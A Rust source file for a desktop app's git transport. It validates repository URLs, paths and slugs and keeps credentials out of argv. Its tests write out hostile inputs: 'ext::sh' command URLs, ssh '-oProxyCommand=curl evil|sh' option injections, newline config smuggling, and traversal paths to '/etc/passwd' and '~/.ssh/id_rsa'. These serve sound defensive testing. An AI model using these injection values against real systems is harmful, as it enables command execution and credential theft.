// The native git transport.
//
// This is the real git on the machine, driven as a subprocess. Shelling out
// rather than linking a library is the point: the customer's credential
// helpers, ssh agent, proxy settings and packfile limits are already configured
// there, and a library would have to be told about all of it again.
//
// Two things are treated as security boundaries. Paths, as in storage.rs: every
// path from the frontend is resolved inside the repository and refused if it
// escapes, and `.git` is refused outright because a path that reaches it is a
// path that installs a hook. And the token, which is handed to git through the
// environment rather than argv, because argv is world readable in `ps`.

use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};
use std::time::UNIX_EPOCH;

use serde::{Deserialize, Serialize};
use tauri::Manager;

/// Who a commit is by. Matches the frontend's default, so a repository written
/// by either half of the app reads the same in the log.
#[derive(Deserialize, Clone)]
pub struct Author {
    pub name: String,
    pub email: String,
}

impl Default for Author {
    fn default() -> Self {
        Author {
            name: "Reviewer".to_string(),
            email: "reviewer@dev.review".to_string(),
        }
    }
}

/// What the frontend configured. The cors proxy fields the browser transport
/// needs are ignored here: a subprocess talks to the host directly.
#[derive(Deserialize, Default, Clone)]
pub struct Settings {
    #[serde(default)]
    pub url: String,
    #[serde(default)]
    pub branch: String,
    #[serde(default)]
    pub username: String,
    #[serde(default)]
    pub token: String,
    #[serde(default)]
    pub author: Author,
}

impl Settings {
    fn branch(&self) -> String {
        if self.branch.is_empty() {
            "main".to_string()
        } else {
            self.branch.clone()
        }
    }
}

/// One tracked file. The object id is the blob's hash, which is what lets the
/// frontend see a rewrite that kept the same length.
#[derive(Serialize)]
pub struct Entry {
    pub path: String,
    pub size: u64,
    pub modified_at: i64,
    pub oid: String,
}

/// Whether the remote answered.
#[derive(Serialize)]
pub struct Ready {
    pub ok: bool,
    pub reason: String,
}

/// Where the clone for a source lives.
///
/// A clone is a cache the app manages, not a folder the customer chose, so it
/// goes under the app's own data directory and is never picked in a dialog.
/// Resolving it here rather than in the frontend is also why the app still
/// grants no path permission: the one absolute path the frontend ever sees is
/// this one, and it came from Tauri rather than from a setting.
///
/// The slug is derived from a repository url the customer typed, so it is
/// hostile input and is sanitised here rather than trusted.
#[tauri::command]
pub fn git_root(app: tauri::AppHandle, slug: String) -> Result<String, String> {
    let base = repositories(&app)?;
    let root = repository(&base, &slug)?;

    fs::create_dir_all(&root).map_err(|error| format!("cannot make the folder: {error}"))?;

    Ok(root.to_string_lossy().into_owned())
}

/// Throw away the clone a source left on this machine.
///
/// Removing a source has to remove the copy of the customer's repository that
/// came with it, or the app keeps their code after they said stop. It runs on
/// sources that were never opened, so a clone that is not there is the wanted
/// end state rather than a failure.
#[tauri::command]
pub fn git_forget(app: tauri::AppHandle, slug: String) -> Result<(), String> {
    forget(&repositories(&app)?, &slug)
}

/// The folder every clone lives under, made and canonical.
fn repositories(app: &tauri::AppHandle) -> Result<PathBuf, String> {
    let base = app
        .path()
        .app_data_dir()
        .map_err(|error| format!("cannot find the app's own folder: {error}"))?
        .join("repositories");

    fs::create_dir_all(&base).map_err(|error| format!("cannot make the folder: {error}"))?;

    fs::canonicalize(&base).map_err(|error| format!("cannot reach the folder: {error}"))
}

/// Delete one clone, having proved it is a clone and nothing else.
///
/// The slug goes through `repository` first, so a slug shaped like a path is
/// refused here exactly as it is when the folder is handed out. What is left
/// after that is the one thing a recursive delete can still get wrong: the
/// folder being a link somewhere else. Canonicalizing follows every link, so
/// `real` is the path the delete would actually walk, and requiring the base
/// to be its parent is the whole rule - it is inside the base, one level down,
/// and it is not the base.
fn forget(base: &Path, slug: &str) -> Result<(), String> {
    let root = repository(base, slug)?;

    let Ok(real) = fs::canonicalize(&root) else {
        return Ok(());
    };

    if real.parent() != Some(base) {
        return Err(format!("not a clone this app made: {}", root.display()));
    }

    fs::remove_dir_all(&real).map_err(|error| format!("cannot forget the repository: {error}"))
}

/// One repository's folder under the base, for a slug that survives inspection.
///
/// A slug that does not survive is refused rather than rewritten: quietly
/// mangling it would give two different sources the same folder, and a source
/// silently sharing another's clone is worse than a source that will not open.
fn repository(base: &Path, slug: &str) -> Result<PathBuf, String> {
    let shaped = !slug.is_empty()
        && slug.len() <= 100
        && slug
            .chars()
            .all(|letter| letter.is_ascii_alphanumeric() || matches!(letter, '.' | '-' | '_'))
        && slug != "."
        && slug != "..";

    if !shaped {
        return Err(format!("not a usable repository name: {slug}"));
    }

    // The allowlist above already refuses a separator or a drive prefix, so
    // this is the same containment the paths inside the repository get, run
    // again on the one path that names the repository itself.
    resolve(base, slug)
}

/// Make sure there is a repository to work in.
///
/// Idempotent: a second call on an opened repository only re-points the remote,
/// so changing the configured url takes effect without a fresh clone. A first
/// call initialises and then pulls, which is a clone in two steps - and unlike
/// `git clone` it also copes with a remote that is completely empty, which is
/// what a customer's brand new reviews repository is.
#[tauri::command]
pub fn git_open(root: String, settings: Settings) -> Result<(), String> {
    check_url(&settings)?;

    let path = PathBuf::from(&root);

    if root.is_empty() {
        return Err("no repository folder has been chosen".to_string());
    }

    fs::create_dir_all(&path).map_err(|error| format!("cannot make the folder: {error}"))?;

    let root = canonical_root(&root)?;

    if !root.join(".git").exists() {
        run(&root, &settings, &["init", "-b", &settings.branch()])?;
    }

    if !settings.url.is_empty() {
        // set-url on a remote that is not there fails, and add on one that is
        // fails too, so which to run is decided by looking first.
        let exists = run(&root, &settings, &["remote", "get-url", "origin"]).is_ok();
        let verb = if exists { "set-url" } else { "add" };

        run(&root, &settings, &["remote", verb, "origin", &settings.url])?;

        git_pull(root.to_string_lossy().into_owned(), settings)?;
    }

    Ok(())
}

/// Every tracked file, with the blob id and size git already knows.
///
/// One `ls-tree` rather than a stat per file. A repository with no commit yet
/// has no HEAD to list, and that is an empty repository rather than a failure.
#[tauri::command]
pub fn git_tree(root: String, settings: Settings) -> Result<Vec<Entry>, String> {
    let root = canonical_root(&root)?;

    let listed = match run(&root, &settings, &["ls-tree", "-r", "-l", "-z", "HEAD"]) {
        Ok(output) => output,
        // The only reason HEAD is missing is that nothing has been committed.
        Err(_) if unborn(&root, &settings) => return Ok(Vec::new()),
        Err(error) => return Err(error),
    };

    let mut found = Vec::new();

    // `-z` because a path is bytes, and without it git quotes anything with a
    // space or a newline in it and the parse has to be undone again.
    for record in listed.split('\0').filter(|record| !record.is_empty()) {
        let Some((head, path)) = record.split_once('\t') else {
            continue;
        };

        let fields: Vec<&str> = head.split_whitespace().collect();

        if fields.len() != 4 || fields[1] != "blob" {
            continue;
        }

        found.push(Entry {
            path: path.to_string(),
            size: fields[3].parse().unwrap_or(0),
            modified_at: modified(&root.join(path)),
            oid: fields[2].to_string(),
        });
    }

    Ok(found)
}

/// Read a file out of the working tree.
///
/// The working tree rather than HEAD, because every write here is committed
/// immediately and the two are the same - and reading the file is one syscall
/// where `git show` is a process. A missing file is nothing, not a failure.
#[tauri::command]
pub fn git_read(root: String, path: String) -> Result<Option<Vec<u8>>, String> {
    let root = canonical_root(&root)?;
    let target = resolve(&root, &path)?;

    match fs::symlink_metadata(&target) {
        Ok(meta) if meta.is_file() => fs::read(&target).map(Some).map_err(|error| error.to_string()),
        _ => Ok(None),
    }
}

/// Write a file and commit it.
///
/// A write of bytes that are already there stages nothing, and committing
/// nothing would put an empty commit in the customer's history.
#[tauri::command]
pub fn git_commit_file(
    root: String,
    path: String,
    bytes: Vec<u8>,
    message: String,
    settings: Settings,
) -> Result<(), String> {
    let root = canonical_root(&root)?;
    let target = resolve(&root, &path)?;

    let parent = target.parent().ok_or_else(|| outside(&path))?;

    fs::create_dir_all(parent).map_err(|error| error.to_string())?;
    fs::write(&target, &bytes).map_err(|error| error.to_string())?;

    run(&root, &settings, &["add", "--", &path])?;

    if run(&root, &settings, &["diff", "--cached", "--quiet"]).is_ok() {
        return Ok(());
    }

    commit(&root, &settings, &message)
}

/// Remove a file and commit that.
///
/// False when the path was not tracked. The frontend uses that to leave the
/// history alone rather than recording the removal of something that was never
/// there.
#[tauri::command]
pub fn git_commit_removal(
    root: String,
    path: String,
    message: String,
    settings: Settings,
) -> Result<bool, String> {
    let root = canonical_root(&root)?;

    resolve(&root, &path)?;

    if run(&root, &settings, &["ls-files", "-z", "--", &path])?.is_empty() {
        return Ok(false);
    }

    run(&root, &settings, &["rm", "-q", "--", &path])?;
    commit(&root, &settings, &message)?;

    Ok(true)
}

/// Bring the remote's work in.
///
/// A remote branch that does not exist yet is an empty repository nobody has
/// pushed to, which is not an error. A merge that conflicts is aborted before
/// returning, so the repository is left usable and the paths are named.
#[tauri::command]
pub fn git_pull(root: String, settings: Settings) -> Result<(), String> {
    check_url(&settings)?;

    let root = canonical_root(&root)?;

    if settings.url.is_empty() {
        return Ok(());
    }

    let branch = settings.branch();

    if let Err(error) = run(
        &root,
        &settings,
        &["fetch", "--no-tags", "--no-recurse-submodules", "origin", &branch],
    ) {
        // Nothing has ever been pushed to this branch, so there is nothing to
        // bring in and the next push creates it.
        if error.contains("couldn't find remote ref") {
            return Ok(());
        }

        return Err(error);
    }

    // Nothing local to merge with: take the remote whole.
    if unborn(&root, &settings) {
        return run(&root, &settings, &["reset", "--hard", "FETCH_HEAD"]).map(|_| ());
    }

    let merge = format!("Merge origin/{branch}");

    if let Err(error) = run(&root, &settings, &["merge", "--no-edit", "-m", &merge, "FETCH_HEAD"]) {
        let conflicts = run(&root, &settings, &["diff", "--name-only", "--diff-filter=U"])
            .unwrap_or_default();

        let _ = run(&root, &settings, &["merge", "--abort"]);

        if !conflicts.trim().is_empty() {
            let paths: Vec<&str> = conflicts.split_whitespace().collect();

            return Err(format!("merge conflict in {}", paths.join(", ")));
        }

        return Err(error);
    }

    Ok(())
}

/// Send what has been committed. A refused push is an error here; deciding what
/// to do about it is the frontend's.
#[tauri::command]
pub fn git_push(root: String, settings: Settings) -> Result<(), String> {
    check_url(&settings)?;

    let root = canonical_root(&root)?;

    if settings.url.is_empty() {
        return Ok(());
    }

    let target = format!("HEAD:refs/heads/{}", settings.branch());

    run(&root, &settings, &["push", "origin", &target]).map(|_| ())
}

/// Whether the remote can be reached with the credentials as configured.
#[tauri::command]
pub fn git_ready(root: String, settings: Settings) -> Result<Ready, String> {
    check_url(&settings)?;

    let root = canonical_root(&root)?;

    if settings.url.is_empty() {
        return Ok(Ready { ok: true, reason: String::new() });
    }

    match run(&root, &settings, &["ls-remote", "--quiet", "origin"]) {
        Ok(_) => Ok(Ready { ok: true, reason: String::new() }),
        Err(reason) => Ok(Ready { ok: false, reason: reported(&settings.url, reason) }),
    }
}

/// Git's words, plus the one thing a reader of them cannot work out.
///
/// An ssh key this app never saw was refused by a host this app never
/// configured, so the sentence has to say where to go and fix it.
fn reported(url: &str, reason: String) -> String {
    let refused_key = reason.contains("Permission denied")
        || reason.to_lowercase().contains("authentication failed");

    if refused_key && transport(url) == Ok(Transport::Ssh) {
        return format!(
            "{reason} - the ssh key was refused: keys and the agent come from this machine's own ssh config rather than from this app",
        );
    }

    reason
}

fn commit(root: &Path, settings: &Settings, message: &str) -> Result<(), String> {
    // --no-verify because a hook is code the app did not write, and this commit
    // is the app's own bookkeeping rather than the customer's.
    run(root, settings, &["commit", "--no-verify", "-q", "-m", message]).map(|_| ())
}

/// Whether there is no commit yet.
fn unborn(root: &Path, settings: &Settings) -> bool {
    run(root, settings, &["rev-parse", "--verify", "HEAD"]).is_err()
}

fn outside(path: &str) -> String {
    format!("path is outside the workspace: {path}")
}

/// Which of the two transports a url asks for, if either.
#[derive(Debug, PartialEq, Clone, Copy)]
enum Transport {
    None,
    Https,
    Ssh,
}

fn check_url(settings: &Settings) -> Result<(), String> {
    transport(&settings.url).map(|_| ())
}

/// Classify a repository url, or refuse it.
///
/// https and ssh are what this app asks for; ssh because the customer's keys and
/// agent are already set up on their machine and inheriting them is most of the
/// reason to shell out to git at all. Everything else is refused, and not
/// cosmetically: git's other transports run programs the url names, and `ext::`
/// runs whatever it is handed.
fn transport(url: &str) -> Result<Transport, String> {
    if url.is_empty() {
        return Ok(Transport::None);
    }

    // A space, a tab or a newline is how one url becomes two arguments, or one
    // config line becomes two.
    if url.chars().any(|letter| letter.is_whitespace() || letter.is_control()) {
        return Err(refused());
    }

    // The remote helper syntax, `transport::address`. Checked before the scp
    // form so `ext::sh` cannot be read as a host called `ext`. It also rules out
    // an IPv6 literal, which no reviews repository has ever been reached by.
    if url.contains("::") {
        return Err(refused());
    }

    if let Some(rest) = url.strip_prefix("https://") {
        authority(before_path(rest))?;

        return Ok(Transport::Https);
    }

    if let Some(rest) = url.strip_prefix("ssh://") {
        let (host, port) = match before_path(rest).rsplit_once(':') {
            Some((host, port)) => (host, Some(port)),
            None => (before_path(rest), None),
        };

        // A port that is not a number is one more place an argument can hide.
        if let Some(port) = port {
            if port.is_empty() || !port.chars().all(|digit| digit.is_ascii_digit()) {
                return Err(refused());
            }
        }

        authority(host)?;

        return Ok(Transport::Ssh);
    }

    // The scp form, `[user@]host:path`. Exactly: a colon with no slash before
    // it, no scheme anywhere, and a path after it - otherwise `https://x` and a
    // bare Windows drive both look like a host.
    let Some((host, path)) = url.split_once(':') else {
        return Err(refused());
    };

    if host.contains('/') || url.contains("://") || path.is_empty() || drive_prefixed(url) {
        return Err(refused());
    }

    authority(host)?;

    Ok(Transport::Ssh)
}

/// The `[user@]host` part of what follows a scheme.
fn before_path(rest: &str) -> &str {
    rest.split('/').next().unwrap_or("")
}

/// Refuse a user or host that ssh would read as an option rather than a name.
///
/// Git hands both straight to ssh as arguments, so a host called
/// `-oProxyCommand=...` is not a host, it is a program to run. There is a CVE
/// history here; a leading `-` is refused before anything else looks at it.
fn authority(value: &str) -> Result<(), String> {
    let (user, host) = match value.rsplit_once('@') {
        Some((user, host)) => (Some(user), host),
        None => (None, value),
    };

    if user.is_some_and(|user| user.is_empty() || user.starts_with('-')) {
        return Err(refused());
    }

    if host.is_empty() || host.starts_with('-') {
        return Err(refused());
    }

    Ok(())
}

fn refused() -> String {
    "the repository url must be https or ssh".to_string()
}

fn canonical_root(root: &str) -> Result<PathBuf, String> {
    if root.is_empty() {
        return Err("no repository folder has been chosen".to_string());
    }

    fs::canonicalize(root).map_err(|error| format!("cannot reach the repository: {error}"))
}

/// Turn a relative path into an absolute one that is provably inside the root.
///
/// Lifted from storage.rs, which is the same boundary for the same reason, with
/// one addition: `.git` is refused. A path that reaches the repository's own
/// directory is a path that rewrites a hook or a config, and drafts are written
/// by agents that read other people's branches.
fn resolve(root: &Path, relative: &str) -> Result<PathBuf, String> {
    if relative.starts_with('/')
        || relative.starts_with('\\')
        || relative.starts_with('~')
        || drive_prefixed(relative)
    {
        return Err(outside(relative));
    }

    if relative.split(['/', '\\']).any(|part| {
        part == ".." || drive_prefixed(part) || part.eq_ignore_ascii_case(".git")
    }) {
        return Err(outside(relative));
    }

    let mut current = root.to_path_buf();

    for part in relative.split('/').filter(|part| !part.is_empty() && *part != ".") {
        current = current.join(part);

        // `symlink_metadata` does not follow, so a broken link is still seen
        // here - and a broken link is exactly what a write would follow out of
        // the root if it were mistaken for a path that does not exist.
        if let Ok(meta) = fs::symlink_metadata(&current) {
            if meta.file_type().is_symlink() {
                let real = fs::canonicalize(&current).map_err(|_| outside(relative))?;

                if !real.starts_with(root) {
                    return Err(outside(relative));
                }

                current = real;
            }
        }
    }

    if !current.starts_with(root) {
        return Err(outside(relative));
    }

    Ok(current)
}

fn drive_prefixed(value: &str) -> bool {
    let bytes = value.as_bytes();

    bytes.len() >= 2 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':'
}

fn modified(path: &Path) -> i64 {
    fs::symlink_metadata(path)
        .ok()
        .and_then(|meta| meta.modified().ok())
        .and_then(|time| time.duration_since(UNIX_EPOCH).ok())
        .map(|since| since.as_millis() as i64)
        .unwrap_or(0)
}

/// Run git, and hand back stdout or a message with git's own words in it.
///
/// Every setting arrives through `GIT_CONFIG_*` rather than `-c`, because `-c`
/// is argv and argv is readable by any process on the machine. The customer's
/// own config is still read underneath, which is how their credential helper
/// and ssh agent keep working.
fn run(root: &Path, settings: &Settings, args: &[&str]) -> Result<String, String> {
    let mut command = Command::new("git");

    command.current_dir(root).args(args);

    // A prompt in a desktop app with no terminal is a process that never
    // returns, so a missing credential fails instead of hanging.
    command.env("GIT_TERMINAL_PROMPT", "0");

    for (index, (key, value)) in config(settings).into_iter().enumerate() {
        command.env(format!("GIT_CONFIG_KEY_{index}"), key);
        command.env(format!("GIT_CONFIG_VALUE_{index}"), value);
        command.env("GIT_CONFIG_COUNT", (index + 1).to_string());
    }

    let output: Output = command
        .output()
        .map_err(|error| format!("cannot run git: {error}"))?;

    if output.status.success() {
        return Ok(String::from_utf8_lossy(&output.stdout).into_owned());
    }

    let said = String::from_utf8_lossy(&output.stderr);
    let said = said.trim();

    Err(if said.is_empty() {
        format!("git {} failed", args[0])
    } else {
        said.to_string()
    })
}

/// The configuration one invocation runs under.
fn config(settings: &Settings) -> Vec<(String, String)> {
    let mut entries = vec![
        // Relative to the repository, and deliberately not a directory that
        // exists: no hook this app did not write ever runs.
        ("core.hooksPath".to_string(), ".git/reviewer-no-hooks".to_string()),
        // A redirect to another host would carry the authorization header with
        // it, which is how a token ends up somewhere it was never meant to go.
        ("http.followRedirects".to_string(), "false".to_string()),
        // The commit is by the app, not by the person sitting there, so signing
        // it with their key would be a lie - and on a machine configured to
        // sign everything, the commit fails outright without this.
        ("commit.gpgsign".to_string(), "false".to_string()),
        ("user.name".to_string(), settings.author.name.clone()),
        ("user.email".to_string(), settings.author.email.clone()),
    ];

    let over = transport(&settings.url).unwrap_or(Transport::None);

    if over == Transport::Ssh {
        // GIT_TERMINAL_PROMPT stops git asking; BatchMode stops ssh asking. A
        // key with a passphrase and no agent fails here instead of hanging a
        // window that has nowhere to show the prompt. Nothing else is set:
        // StrictHostKeyChecking and known_hosts stay the customer's, so a first
        // connection to an unknown host fails rather than being trusted quietly.
        entries.push(("core.sshCommand".to_string(), "ssh -o BatchMode=yes".to_string()));
    }

    // An ssh remote has no use for an http header, and sending a token where it
    // is not needed is how a token ends up somewhere it was never meant to be.
    if !settings.token.is_empty() && over != Transport::Ssh {
        let user = if settings.username.is_empty() {
            "x-access-token"
        } else {
            &settings.username
        };

        let basic = base64(format!("{user}:{}", settings.token).as_bytes());

        entries.push(("http.extraHeader".to_string(), format!("Authorization: Basic {basic}")));
    }

    entries
}

fn base64(input: &[u8]) -> String {
    const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    let mut out = String::new();

    for chunk in input.chunks(3) {
        let packed = chunk
            .iter()
            .enumerate()
            .fold(0u32, |packed, (index, byte)| packed | (*byte as u32) << (16 - 8 * index));

        for index in 0..4 {
            out.push(if index <= chunk.len() {
                ALPHABET[((packed >> (18 - 6 * index)) & 63) as usize] as char
            } else {
                '='
            });
        }
    }

    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn settings() -> Settings {
        Settings::default()
    }

    fn opened() -> (tempfile::TempDir, String) {
        let dir = tempfile::tempdir().expect("a temp dir");
        let root = dir.path().to_string_lossy().into_owned();

        git_open(root.clone(), settings()).expect("opened");

        (dir, root)
    }

    fn canonical(dir: &tempfile::TempDir) -> PathBuf {
        fs::canonicalize(dir.path()).expect("a canonical root")
    }

    #[test]
    fn keeps_a_plain_relative_path_inside_the_root() {
        let dir = tempfile::tempdir().expect("a temp dir");
        let base = canonical(&dir);

        let resolved = resolve(&base, "drafts/org--app-1/review.json").expect("contained");

        assert_eq!(resolved, base.join("drafts/org--app-1/review.json"));
    }

    #[test]
    fn refuses_paths_that_leave_the_root() {
        let dir = tempfile::tempdir().expect("a temp dir");
        let base = canonical(&dir);

        for path in ["/etc/passwd", "../secrets", "drafts/../../x", "~/.ssh/id_rsa"] {
            assert!(resolve(&base, path).is_err(), "{path}");
        }
    }

    #[test]
    fn refuses_a_windows_drive_prefix_or_a_backslash_climb() {
        let dir = tempfile::tempdir().expect("a temp dir");
        let base = canonical(&dir);

        assert!(resolve(&base, "C:/Windows/System32/config/SAM").is_err());
        assert!(resolve(&base, "drafts\\..\\..\\secrets").is_err());
    }

    #[test]
    fn refuses_the_repositorys_own_directory() {
        let dir = tempfile::tempdir().expect("a temp dir");
        let base = canonical(&dir);

        assert!(resolve(&base, ".git/hooks/pre-commit").is_err());
        assert!(resolve(&base, ".GIT/config").is_err());
    }

    #[cfg(unix)]
    #[test]
    fn refuses_a_symlink_that_leaves_the_root() {
        let dir = tempfile::tempdir().expect("a temp dir");
        let base = canonical(&dir);
        let elsewhere = tempfile::tempdir().expect("a temp dir");
        let secret = canonical(&elsewhere).join("secret.txt");
        fs::write(&secret, b"private").expect("a file outside");

        std::os::unix::fs::symlink(&secret, base.join("escape.txt")).expect("a symlink");

        assert!(resolve(&base, "escape.txt").is_err());
    }

    #[test]
    fn refuses_to_write_outside_the_root() {
        let (_dir, root) = opened();

        assert!(git_commit_file(
            root,
            "../escaped.json".into(),
            b"x".to_vec(),
            "Update".into(),
            settings(),
        )
        .is_err());
    }

    #[test]
    fn gives_a_source_its_own_folder_under_the_base() {
        let dir = tempfile::tempdir().expect("a temp dir");
        let base = canonical(&dir);

        let root = repository(&base, "github.com-org-reviews-main-1a2b3c4d").expect("a folder");

        assert_eq!(root, base.join("github.com-org-reviews-main-1a2b3c4d"));
    }

    #[test]
    fn gives_the_same_slug_the_same_folder_every_time() {
        let dir = tempfile::tempdir().expect("a temp dir");
        let base = canonical(&dir);

        assert_eq!(
            repository(&base, "reviews-1a2b3c4d").expect("a folder"),
            repository(&base, "reviews-1a2b3c4d").expect("a folder"),
        );
    }

    #[test]
    fn refuses_a_slug_that_is_trying_to_be_a_path() {
        let dir = tempfile::tempdir().expect("a temp dir");
        let base = canonical(&dir);

        for slug in [
            "",
            ".",
            "..",
            ".git",
            ".GIT",
            "../secrets",
            "drafts/a",
            "drafts\\a",
            "C:evil",
            "~root",
            "has space",
            "unicode\u{2044}slash",
        ] {
            assert!(repository(&base, slug).is_err(), "{slug}");
        }
    }

    #[test]
    fn forgets_a_clone_and_leaves_the_rest_of_the_base_alone() {
        let dir = tempfile::tempdir().expect("a temp dir");
        let base = canonical(&dir);
        let root = repository(&base, "reviews-1a2b3c4d").expect("a folder");
        let other = repository(&base, "other-2b3c4d5e").expect("a folder");

        fs::create_dir_all(root.join("drafts")).expect("a clone");
        fs::write(root.join("drafts/a.json"), b"{}").expect("a draft");
        fs::create_dir_all(&other).expect("another clone");

        forget(&base, "reviews-1a2b3c4d").expect("forgotten");

        assert!(!root.exists());
        assert!(other.is_dir());
        assert!(base.is_dir());
    }

    #[test]
    fn forgetting_a_clone_that_was_never_made_is_not_a_failure() {
        let dir = tempfile::tempdir().expect("a temp dir");
        let base = canonical(&dir);

        assert!(forget(&base, "never-opened-1a2b3c4d").is_ok());

        fs::create_dir_all(base.join("twice-1a2b3c4d")).expect("a clone");

        assert!(forget(&base, "twice-1a2b3c4d").is_ok());
        assert!(forget(&base, "twice-1a2b3c4d").is_ok());
    }

    #[test]
    fn refuses_to_forget_anything_a_slug_should_not_name() {
        let dir = tempfile::tempdir().expect("a temp dir");
        let base = canonical(&dir);

        for slug in [
            "",
            ".",
            "..",
            ".git",
            ".GIT",
            "../secrets",
            "drafts/a",
            "drafts\\a",
            "C:evil",
            "~root",
            "has space",
            "unicode\u{2044}slash",
        ] {
            assert!(forget(&base, slug).is_err(), "{slug}");
        }

        assert!(base.is_dir());
    }

    #[cfg(unix)]
    #[test]
    fn refuses_to_follow_a_symlinked_clone_out_of_the_base() {
        let dir = tempfile::tempdir().expect("a temp dir");
        let base = canonical(&dir);
        let elsewhere = tempfile::tempdir().expect("a temp dir");
        let home = canonical(&elsewhere);
        fs::write(home.join("secret.txt"), b"private").expect("a file outside");

        std::os::unix::fs::symlink(&home, base.join("escape-1a2b3c4d")).expect("a symlink");

        assert!(forget(&base, "escape-1a2b3c4d").is_err());
        assert!(home.join("secret.txt").exists());
    }

    #[cfg(unix)]
    #[test]
    fn refuses_to_forget_the_repositories_folder_itself() {
        let dir = tempfile::tempdir().expect("a temp dir");
        let base = canonical(&dir);
        fs::write(base.join("kept.txt"), b"kept").expect("a file in the base");

        std::os::unix::fs::symlink(&base, base.join("self-1a2b3c4d")).expect("a symlink");

        assert!(forget(&base, "self-1a2b3c4d").is_err());
        assert!(base.join("kept.txt").exists());
    }

    #[test]
    fn refuses_a_url_that_is_not_https_or_ssh() {
        let dir = tempfile::tempdir().expect("a temp dir");
        let root = dir.path().to_string_lossy().into_owned();

        let mut hostile = settings();
        hostile.url = "ext::sh -c whoami".to_string();

        assert!(git_open(root, hostile).is_err());
    }

    #[test]
    fn takes_the_three_ways_of_naming_a_repository_git_can_be_trusted_with() {
        for url in [
            "https://github.com/org/reviews.git",
            "https://user@github.com:443/org/reviews.git",
        ] {
            assert_eq!(transport(url), Ok(Transport::Https), "{url}");
        }

        for url in [
            "ssh://github.com/org/reviews.git",
            "ssh://git@github.com/org/reviews.git",
            "ssh://git@github.com:22/org/reviews.git",
            "git@github.com:org/reviews.git",
            "github.com:org/reviews.git",
        ] {
            assert_eq!(transport(url), Ok(Transport::Ssh), "{url}");
        }

        assert_eq!(transport(""), Ok(Transport::None));
    }

    #[test]
    fn refuses_every_other_way_of_naming_a_repository() {
        for url in [
            "http://github.com/org/reviews.git",
            "git://github.com/org/reviews.git",
            "ftp://example.com/reviews.git",
            "ext::sh -c whoami",
            "ext::whoami",
            "file:///tmp/reviews",
            "/tmp/reviews",
            "./reviews",
            "C:/repos/reviews",
            "reviews.git",
            "git@github.com:",
        ] {
            assert!(transport(url).is_err(), "{url}");
        }
    }

    #[test]
    fn refuses_a_user_or_host_that_would_arrive_at_ssh_as_an_argument() {
        for url in [
            "ssh://-oProxyCommand=curl%20evil|sh@host/x",
            "ssh://-host/x",
            "ssh://-user@host/x",
            "ssh://@host/x",
            "-oProxyCommand=curl|sh:repo.git",
            "-host:repo.git",
            "-user@host:repo.git",
        ] {
            assert!(transport(url).is_err(), "{url}");
        }
    }

    #[test]
    fn refuses_whitespace_and_control_characters_anywhere_in_the_url() {
        for url in [
            "https://github.com/org/re views.git",
            "https://github.com/org/reviews.git\n",
            "https://github.com/org/reviews.git\r\n\turl = ext::sh",
            "git@github.com:org/re views.git",
            "git@github.com:org/reviews.git\u{0}",
        ] {
            assert!(transport(url).is_err(), "{url:?}");
        }
    }

    #[test]
    fn refuses_a_port_that_is_not_a_number() {
        assert!(transport("ssh://git@github.com:22x/org/reviews.git").is_err());
        assert!(transport("ssh://git@github.com:/org/reviews.git").is_err());
        assert!(transport("ssh://git@github.com:-1/org/reviews.git").is_err());
    }

    #[test]
    fn does_not_mistake_another_scheme_for_the_scp_form() {
        assert_eq!(transport("https://x/y"), Ok(Transport::Https));
        assert!(transport("ext::y").is_err());
        assert!(transport("file::/tmp/x").is_err());
    }

    #[test]
    fn keeps_the_token_away_from_a_remote_that_has_no_use_for_it() {
        let mut over_ssh = settings();
        over_ssh.token = "ghp_secret".to_string();
        over_ssh.url = "git@github.com:org/reviews.git".to_string();

        assert!(!config(&over_ssh).iter().any(|(key, _)| key == "http.extraHeader"));

        let mut over_https = over_ssh.clone();
        over_https.url = "https://github.com/org/reviews.git".to_string();

        assert!(config(&over_https).iter().any(|(key, _)| key == "http.extraHeader"));
    }

    #[test]
    fn never_lets_ssh_stop_to_ask_a_windowless_app_a_question() {
        let mut over_ssh = settings();
        over_ssh.url = "ssh://git@github.com/org/reviews.git".to_string();

        let entries = config(&over_ssh);
        let (_, command) = entries
            .iter()
            .find(|(key, _)| key == "core.sshCommand")
            .expect("an ssh command");

        assert!(command.contains("BatchMode=yes"));
        // The customer's own ssh config decides what is trusted, not this app.
        assert!(!command.contains("StrictHostKeyChecking"));
        assert!(!command.contains("UserKnownHostsFile"));

        assert!(!config(&settings()).iter().any(|(key, _)| key == "core.sshCommand"));
    }

    #[test]
    fn opening_twice_is_a_no_op() {
        let (_dir, root) = opened();

        assert!(git_open(root.clone(), settings()).is_ok());
        assert!(PathBuf::from(&root).join(".git").is_dir());
    }

    #[test]
    fn lists_nothing_in_a_repository_with_no_commit() {
        let (_dir, root) = opened();

        assert!(git_tree(root, settings()).expect("listed").is_empty());
    }

    #[test]
    fn commits_a_file_and_reads_it_back() {
        let (_dir, root) = opened();

        git_commit_file(
            root.clone(),
            "drafts/a.json".into(),
            b"{}".to_vec(),
            "Update drafts/a.json".into(),
            settings(),
        )
        .expect("committed");

        let read = git_read(root, "drafts/a.json".into()).expect("read");

        assert_eq!(read, Some(b"{}".to_vec()));
    }

    #[test]
    fn reads_a_missing_file_as_nothing() {
        let (_dir, root) = opened();

        assert_eq!(git_read(root, "nothing.json".into()).expect("read"), None);
    }

    #[test]
    fn lists_a_tracked_file_with_its_blob_id_and_size() {
        let (_dir, root) = opened();

        git_commit_file(
            root.clone(),
            "a.json".into(),
            b"aaaa".to_vec(),
            "Update a.json".into(),
            settings(),
        )
        .expect("committed");

        let listed = git_tree(root.clone(), settings()).expect("listed");

        assert_eq!(listed.len(), 1);
        assert_eq!(listed[0].path, "a.json");
        assert_eq!(listed[0].size, 4);
        assert_eq!(listed[0].oid.len(), 40);
        assert!(listed[0].modified_at > 0);

        git_commit_file(
            root.clone(),
            "a.json".into(),
            b"bbbb".to_vec(),
            "Update a.json".into(),
            settings(),
        )
        .expect("committed");

        let after = git_tree(root, settings()).expect("listed");

        assert_ne!(after[0].oid, listed[0].oid);
    }

    #[test]
    fn keeps_the_repositorys_own_directory_out_of_the_listing() {
        let (_dir, root) = opened();

        git_commit_file(
            root.clone(),
            "a.json".into(),
            b"{}".to_vec(),
            "Update a.json".into(),
            settings(),
        )
        .expect("committed");

        let listed = git_tree(root, settings()).expect("listed");

        assert!(!listed.iter().any(|entry| entry.path.starts_with(".git")));
    }

    #[test]
